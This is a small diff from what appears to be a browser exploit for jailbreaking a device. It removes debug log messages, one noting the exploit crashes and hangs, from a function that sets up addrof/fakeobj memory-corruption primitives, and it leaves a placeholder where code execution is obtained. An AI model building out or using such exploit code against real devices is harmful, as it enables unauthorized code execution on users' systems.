@@ -121,9 +121,7 @@ function setupRW() {
     die("[!] Failed to setup addrof/fakeobj primitives");
   }
   debug_log("[+] Succesfully got addrof/fakeobj");
-  debug_log("[+] So far So good!!!");
-  debug_log("[+] This exploit does crash and hang. Sometimes you even have to retry 10 times to get the jailbreak.");
-  debug_log("Carpe diem!");
+
   /* Getting code execution */
   /* ... */
   if(window.postExploit) {
